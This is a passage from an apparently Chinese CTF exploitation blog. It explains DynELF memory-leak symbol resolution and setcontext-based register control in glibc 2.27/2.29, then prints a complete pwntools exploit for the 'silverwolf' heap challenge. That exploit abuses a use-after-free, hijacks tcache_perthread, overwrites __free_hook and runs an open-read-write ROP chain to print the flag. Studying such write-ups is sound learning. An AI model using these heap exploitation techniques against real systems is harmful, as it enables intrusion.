class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&quot;&quot;</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&quot;xxx\n&quot;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;x&quot;</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line">      data = buf[:-<span class="number">1</span>]                     </span><br><span class="line">      data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>了解一下,要求不高</p><h3 id="获取elf内存加载基地址"><a href="#获取elf内存加载基地址" class="headerlink" title="获取elf内存加载基地址"></a>获取elf内存加载基地址</h3><p>已知elf加载内存范围内的一个地址ptr，将该地址进行页对齐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page_size = 0x1000page_mask = ~(page_size - 1)ptr &amp;= page_mask</span><br></pre></td></tr></table></figure><p>然后对比内存页起始字符串是否为’\x7fELF’，如果不是，一直向低地址内存页(ptr -= page_size)进行查找，找到符合该条件的页面，该页面起始地址就是elf文件内存加载基地址。</p><p>寻找elf内存加载基地址的示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_144448.png" alt=""></p><h3 id="获取libc-so内存加载基地址"><a href="#获取libc-so内存加载基地址" class="headerlink" title="获取libc.so内存加载基地址"></a>获取libc.so内存加载基地址</h3><p>elf是动态链接的可执行文件，在该类型文件中有一个link_map双向链表，其中包含了每个动态加载的库的路径和加载基址等信息</p><p>可以通过两种途径获取link_map链表：一是在所有ELF文件中，通过Dynamic段DT_DEBUG区域得到。二是在non-RELRO ELF文件中，link_map地址存在于.got.plt区节中，该区节的加载地址可以从DYNAMIC段DT_PLTGOT区域得到。</p><p>这两种途径都需要知道elf的DYNAMIC段地址：我们在第一步中获取了elf内存加载基地址，由此可以得到elf段表，通过解析elf段表可以得到DYNAMIC基地址。</p><p>通过第二种方式获取link_map结构的示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_144541.png" alt=""></p><h3 id="获取libc-so的hash表、动态符号表、字符串表基地址"><a href="#获取libc-so的hash表、动态符号表、字符串表基地址" class="headerlink" title="获取libc.so的hash表、动态符号表、字符串表基地址"></a>获取libc.so的hash表、动态符号表、字符串表基地址</h3><p>在所有需要导出函数给其他文件使用的ELF文件（例如: “libc.so”）中，用动态符号表、字符串表、hash表等一系列表用于指示导出符号（例如:”system”）的名称、地址、hash值等信息。通过libc.so的Dynamic段DT_GNU_HASH、DT_SYMTAB、DT_STRTAB可以获取hash表、动态符号表、字符串表在内存中的基地址。</p><h3 id="通过hash表获取system函数地址"><a href="#通过hash表获取system函数地址" class="headerlink" title="通过hash表获取system函数地址"></a>通过hash表获取system函数地址</h3><p>hash表是用于查找符号的散列表，通过libc.so的hash表可以找到system函数内存加载地址，在ELF文件中有SYSV、GNU两种类型的hash表，其中通过GNU HASH查找system函数地址示意图如下。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_144815.png" alt=""></p><p>图中： nbuckets是hash buckets的数值，symndx是hash表映射符号表的起始索引，Bloom Filter用作过滤不在符号表中的符号名称，在DynELF中并没有使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=gnu_hash(“system”)，gnu_hash是GNU HASH算法函数ndx=hash%nbuckets，ndx是符号表中所有 符号HASH%nubuckets 相等的起始索引</span><br></pre></td></tr></table></figure><p>最后：内存泄露函数在过程中用作读取程序内存数据，像上面例子中获取link_map、DYNAMIC段、elf段表等内容都是通过内存泄露函数。</p><h1 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>setcontext是libc中的一个函数</p><p><strong>2.27版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p><strong>2.29版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000055E00                               public setcontext ; weak</span><br><span class="line">.text:0000000000055E00                               setcontext proc near                    ; CODE XREF: sub_5C160+C↓p</span><br><span class="line">.text:0000000000055E00                                                                       ; DATA XREF: LOAD:000000000000C6D8↑o</span><br><span class="line">.text:0000000000055E00                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E00 57                            push    rdi</span><br><span class="line">.text:0000000000055E01 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000055E08 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:0000000000055E0A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:0000000000055E0F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000055E15 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:0000000000055E1A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000055E1C 5A                            pop     rdx</span><br><span class="line">.text:0000000000055E1D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000055E23 73 5B                         jnb     short loc_55E80</span><br><span class="line">.text:0000000000055E23</span><br><span class="line">.text:0000000000055E25 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000055E2C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000055E2E 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000055E35 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000055E3C 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000055E43 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000055E47 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000055E4B 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000055E4F 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000055E53 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000055E57 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000055E5E 51                            push    rcx</span><br><span class="line">.text:0000000000055E5F 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055E63 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055E67 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000055E6E 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000055E72 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055E76 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055E76                               ; &#125; // starts at 55E00</span><br><span class="line">.text:0000000000055E7D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E7D 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000055E7F C3                            retn</span><br></pre></td></tr></table></figure><hr><p>不难看出利用的核心是rdi(2.29以前)和rdx(2.29及以后)</p><p>要从特定位置:<code>mov rsp , [??]</code>开始执行</p><p>需要从特定位置开始是因为上面的代码会使程序crash</p><p>程序控制了除rax以外的几乎所有寄存器,</p><p>其中rip是通过以下代码控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, [rdi/rdx+0A8h]</span><br><span class="line">push    rcx</span><br><span class="line">....</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>唯一不可控的rax也在 <code>xor   eax, eax</code>的作用下变为<strong>零</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h3><p>2.29以下的利用要更为简单一些</p><p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题。我们通常是吧 setcontext + 53 写进 <strong>free_hook 或者 </strong>malloc_hook 中，然后建立或者释放一个堆块，特别释放时 rdi 就会是该堆块的 chunk 头，那如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序的执行流。</p><h3 id="2-29及以上"><a href="#2-29及以上" class="headerlink" title="2.29及以上"></a>2.29及以上</h3><p>2.29 最大的变动就是 setcontext 里控制寄存器由 rdi 变成了 rdx，这就使得我们无法通过直接控制 free 的堆块来控制寄存器。所以要用到一些 gadget 来把 rdi 和 rdx 转换一下。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><p>checksec,保护全开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>ida可以看到有开启沙盒,只允许orw</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>功能是老四样,不过同时只能申请一个chunk</p><p>其中delete存在uaf,edit存在off-by-null</p><p><strong>利用思路:</strong></p><ol><li>先清空seccomp带来的chunk</li><li>泄露heap_base</li><li>利用uaf写next为tcache_pthread,将其申请出来</li><li>七次free,每次都要破坏它的key</li><li>满后放入unsortedbin,泄露libc</li><li>准备好各个gadget,因为控制的是返回流所以使用gadeget</li><li>修改tcahe_pethread,使得申请chunk得到目标地址</li><li>写free_hook,同时在堆中布置参数环境</li><li>free触发orw</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./silverwolf&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./silverwolf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cho=<span class="string">b&#x27;Your choice: &#x27;</span>      <span class="comment"># choice提示语</span></span><br><span class="line">siz=<span class="string">b&#x27;Size: &#x27;</span>     <span class="comment"># size输入提示语</span></span><br><span class="line">con=<span class="string">b&#x27;Content: &#x27;</span>         <span class="comment"># content输入提示语</span></span><br><span class="line">ind=<span class="string">b&#x27;Index: &#x27;</span>      <span class="comment"># index输入提示语</span></span><br><span class="line">edi=<span class="string">b&#x27;&#x27;</span>          <span class="comment"># edit输入提示语</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(siz,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(cho,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(ind,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendafter(con,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line"> </span><br><span class="line">    add(<span class="number">0x58</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">raw = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;raw :&quot;</span>+<span class="built_in">hex</span>(raw))</span><br><span class="line">heap = raw-<span class="number">0x11b0</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment">#申请free78申请到了tacahce pthread，并没有做检查</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free()  <span class="comment">#此时free就是放入0x250的链中</span></span><br><span class="line">        edit(p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">free()<span class="comment"># tcache满了，将tacahce pthread放入unsourted bin</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;setcontext:&quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line">pop_rdi = libc.address+<span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi = libc.address+<span class="number">0x0000000000023eea</span></span><br><span class="line">syscall = <span class="number">0xD2745</span>+libc.address</span><br><span class="line">pop_rdx_r10 = <span class="number">0x0000000000130544</span>+libc.address</span><br><span class="line">pop_rax = libc.address + <span class="number">0x0000000000043ae8</span></span><br><span class="line"></span><br><span class="line">edit(p8(<span class="number">0x1</span>)*<span class="number">64</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap+<span class="number">0xef8</span>)+p64(free_hook)+p64(heap+<span class="number">0xe18</span>)+p64(heap+<span class="number">0xe80</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#修改tcache_pethread,可以任意写</span></span><br><span class="line">success(<span class="string">&quot;orw:&quot;</span>+<span class="built_in">hex</span>(heap+<span class="number">0xe18</span>))</span><br><span class="line">add(<span class="number">0x58</span>)<span class="comment"># 把freehook申请出来</span></span><br><span class="line">edit(p64(setcontext)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">flag_str_addr = heap+<span class="number">0xf30</span></span><br><span class="line">flag_addr = heap+<span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rsp = heap+<span class="number">0xe18</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">0</span></span><br><span class="line">r12 = <span class="number">0</span></span><br><span class="line">r13 = <span class="number">0</span></span><br><span class="line">r14 = <span class="number">0</span></span><br><span class="line">stack_pivot = flat(rbx,rbp,r12,r13,r14,rsp+<span class="number">8</span>,pop_rdi,<span class="string">b&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;stack_pivot len:&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(stack_pivot)))</span><br><span class="line">edit(stack_pivot+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">orw1 = flat(pop_rdi,flag_str_addr,pop_rsi,<span class="number">0</span>,pop_rax,<span class="number">2</span>,syscall,pop_rdi,<span class="number">3</span>,pop_rsi,flag_addr,pop_rdx_r10,<span class="number">0x100</span>,)</span><br><span class="line"></span><br><span class="line">edit(orw1+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">orw2 = flat(<span class="number">0</span>,pop_rax,<span class="number">0</span>,syscall,pop_rdi,<span class="number">1</span>,pop_rsi,flag_addr,pop_rdx_r10,<span class="number">0x100</span>,<span class="number">0</span>,pop_rax,<span class="number">1</span>,syscall)</span><br><span class="line">edit(orw2+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">1. allocate</span><br><span class="line">2. edit</span><br><span class="line">3. show</span><br><span class="line">4. delete</span><br><span class="line">5. exit</span><br><span class="line">Your choice: Index: flag&#123;test&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x00\x00\x00`\x00\x00\x00\x00ò\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe2�\x17\x00\x00\x00\x00\x00\xe3�\x17\x00\x00\x00\x00\x00\x00\x00\x00\x001\x00\x00\x00\x00\xdc\xe9\xc7&lt;\x7f\x000\xe6�\x17\x00\x03\x00\x00\x00P\xe4�\x17\x00\x00\x00\x00\x00!\x00\x00\x00\x00\xe2�\x17\x00\x00\x00\x00\x00$  